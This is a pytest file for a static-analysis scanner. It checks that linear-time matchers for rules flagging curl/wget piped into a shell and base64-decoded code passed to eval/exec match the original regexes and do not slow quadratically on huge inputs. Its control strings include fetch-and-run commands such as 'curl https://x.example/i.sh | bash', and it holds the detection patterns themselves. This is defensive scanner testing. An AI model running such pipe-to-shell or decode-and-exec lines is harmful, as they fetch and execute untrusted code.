"""G203/G204 run in linear time and match exactly like the original regexes.

The plain regexes rescanned to the end of the line from every `curl` /
`exec(` / `atob(` (quadratic: `"curl " * 16000` took 3.9 s). The linear
matchers must return the same span and text as the original `search`.
"""

from __future__ import annotations

import random
import re
import time

import pytest

from zee.gate.static_checks import _PATTERNS, scan_tree

_P = {code: pat for code, _, pat, _ in _PATTERNS}
_ORIG = {
    "G203": re.compile(r"(curl|wget)\b[^\n|]*\|\s*(bash|sh|zsh)\b", re.I),
    "G204": re.compile(
        r"(atob|b64decode|base64\.b64decode)\s*\([^\n)]*\)\s*\)?\s*"
        r"|(eval|exec)\s*\(\s*(atob|.*b64decode)",
        re.I,
    ),
}


def _same(code: str, text: str) -> bool:
    a, b = _ORIG[code].search(text), _P[code].search(text)
    return (a and (a.span(), a.group(0))) == (b and (b.span(), b.group(0)))


CONTROLS = [
    # G203 positives / negatives
    "curl https://x.example/i.sh | bash",
    "wget -qO- http://x | sh",
    "CURL x |\n  zsh",
    "curl a | grep b | bash",          # first | is not a shell: no match
    "curl a\n| bash",                  # newline before the pipe: no match
    "curl a | bashful",                # \b after the shell name
    "mycurl x | sh",
    "curl x | sh; curl y | bash",
    # G204 positives / negatives
    "atob('aGk=')",
    "base64.b64decode(s))",
    "eval(atob(x))",
    "exec( b64decode(s))",
    "exec(compile(base64.b64decode(s), 'x', 'exec'))",
    "eval(x)\nb64decode",              # b64decode on the next line only
    "atob(\n)",                        # newline before ): alt 1 fails
    "exec(\n  atob(x))",
    "nothing to see here",
]


@pytest.mark.parametrize("text", CONTROLS)
@pytest.mark.parametrize("code", ["G203", "G204"])
def test_linear_matcher_equals_original_on_controls(code, text):
    assert _same(code, text)


def test_linear_matcher_equals_original_fuzz():
    alpha = [
        "curl", "wget", "WGET", " ", "|", "\n", "\t", "bash", "sh", "zsh",
        "x", "exec", "eval", "(", ")", "atob", "ATOB", "b64decode",
        "base64.", "base64.b64decode", "shell", "curly",
    ]
    rng = random.Random(7)
    for _ in range(20_000):
        t = "".join(rng.choice(alpha) for _ in range(rng.randint(0, 25)))
        assert _same("G203", t), repr(t)
        assert _same("G204", t), repr(t)


# One "unit" per case and the smaller of the two sizes. Both sizes must stay
# under static_checks._MAX_READ_BYTES (2 MiB) — a file above that is skipped
# unread (G910), which would make the measurement meaningless (0.00 s).
_UNIT = {
    "g203_curl_flood": ("curl ", 200_000),            # 1.0 / 2.0 MB
    "g203_wget_flood": ("wget x ", 145_000),          # 1.0 / 2.0 MB
    "g204_exec_flood": ("exec(", 200_000),            # 1.0 / 2.0 MB
    "g204_atob_flood": ("atob(", 200_000),            # 1.0 / 2.0 MB
    "g204_b64_flood": ("base64.b64decode(", 60_000),  # 1.0 / 2.0 MB
}

# Linear work doubles when the input doubles; the quadratic regression this
# test guards against quadrupled (the original regexes took 3.9 s on
# "curl " * 16_000). A wall-clock budget in seconds measures the machine, not
# the algorithm: on a GitHub runner the old 5.0 s budget was exceeded by 0.09 s
# with the matchers unchanged (2026-10-25). The ratio cancels machine speed out.
_MAX_GROWTH = 3.0     # linear ≈ 2.0, quadratic ≈ 4.0
_REPEATS = 3          # other load can only make a run slower, so take the min

# The growth ratio alone would not notice a constant-factor slowdown (10 s ->
# 20 s still doubles). A budget in seconds would, but it also measures the
# machine. So the budget is expressed in units of a calibration workload run
# on the same machine, in the same process: a plain regex sweep over 2 MB,
# repeated, which uses the same engine but cannot backtrack.
#   measured 2026-10-25 (M1, Python 3.13): calibration 9.4 ms (spread 1 % over
#   5 runs), scan of the 2n input 1.78 s -> 189x. The ceiling below leaves
#   roughly a 3x margin, so a constant-factor regression of 3x or more fails
#   while a slower machine (which slows both numbers) still passes.
_MAX_CALIBRATED = 600
_CAL_RE = re.compile(r"zzzz")          # never matches
_CAL_TEXT = "ab" * 1_000_000           # 2 MB, no backtracking
_CAL_SWEEPS = 20


def _calibration() -> float:
    """Machine speed in seconds, measured with the stdlib only."""
    best = float("inf")
    for _ in range(_REPEATS):
        t = time.perf_counter()
        for _ in range(_CAL_SWEEPS):
            _CAL_RE.search(_CAL_TEXT)
        best = min(best, time.perf_counter() - t)
    return best


def _fastest_scan(tmp_path, text):
    """Shortest wall-clock scan of `text` over _REPEATS runs (seconds)."""
    best = float("inf")
    (tmp_path / "x.sh").write_text(text, encoding="utf-8")
    for _ in range(_REPEATS):
        t = time.perf_counter()
        flags = scan_tree(tmp_path)
        best = min(best, time.perf_counter() - t)
        # A file over the read cap is reported as G910 and never scanned: the
        # timing would then be ~0 s and the test would pass without measuring.
        assert not any(f.code == "G910" for f in flags), "file was not scanned"
    return best


@pytest.mark.parametrize("name", sorted(_UNIT))
def test_pathological_g203_g204_input_stays_linear(tmp_path, name):
    unit, n = _UNIT[name]
    t1 = _fastest_scan(tmp_path, unit * n)
    t2 = _fastest_scan(tmp_path, unit * (2 * n))
    assert t2 < t1 * _MAX_GROWTH, (
        f"{name}: {t1:.2f}s at {n} -> {t2:.2f}s at {2 * n} "
        f"(x{t2 / t1:.1f}; linear is ~x2, quadratic ~x4)"
    )
    cal = _calibration()
    assert t2 < cal * _MAX_CALIBRATED, (
        f"{name}: {t2:.2f}s at {2 * n} is {t2 / cal:.0f}x the calibration "
        f"({cal * 1000:.1f}ms); the ceiling is {_MAX_CALIBRATED}x. The growth "
        f"ratio was x{t2 / t1:.1f}, so this is a constant-factor slowdown, "
        f"not a slower machine."
    )
